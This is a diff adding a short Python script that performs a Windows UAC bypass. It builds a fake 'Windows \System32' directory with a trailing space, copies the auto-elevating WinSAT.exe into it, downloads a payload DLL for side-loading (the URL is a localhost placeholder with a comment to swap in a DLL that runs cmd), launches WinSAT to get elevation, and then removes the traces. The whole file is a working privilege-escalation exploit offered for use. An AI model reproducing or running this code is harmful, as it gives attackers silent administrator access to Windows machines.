@@ -1,0 +1,39 @@
+import os
+import shutil
+import threading
+import requests
+from colorama import Fore, init
+
+
+def log(text: str, indicator: str = "*"):
+    print(f"{Fore.GREEN}[{Fore.RED}{indicator}{Fore.GREEN}] {text}")
+
+
+init()
+
+log("Getting directory char")
+char = os.getcwd().split(":\\")[0] + ":"
+
+log("Creating trailing space directorys")
+os.mkdir(f"\\\\?\\{char}\\Windows ")
+os.mkdir(f"\\\\?\\{char}\\Windows \\System32")
+
+log("Copying auto-elevate application")
+os.system(f"copy \"{char}\\Windows\\System32\\WinSAT.exe\" \"\\\\?\\{char}\\Windows \\System32\\WinSAT.exe\"")
+
+log("Downloading payload DLL")
+# replace link with dll that executes cmd
+r = requests.get("https://localhost/lmao.dll")
+with open(f"\\\\?\\{char}\\Windows \\System32\\lmao.dll", "wb") as f:
+    f.write(r.content)
+
+log("Running the auto-elevate application")
+
+
+def run():
+    os.system(f"\"{char}\\Windows \\System32\\WinSat.exe\"")
+    log("Deleting file")
+    shutil.rmtree(f"\\\\?\\{char}\\Windows ")
+
+
+threading.Thread(target=run).start()
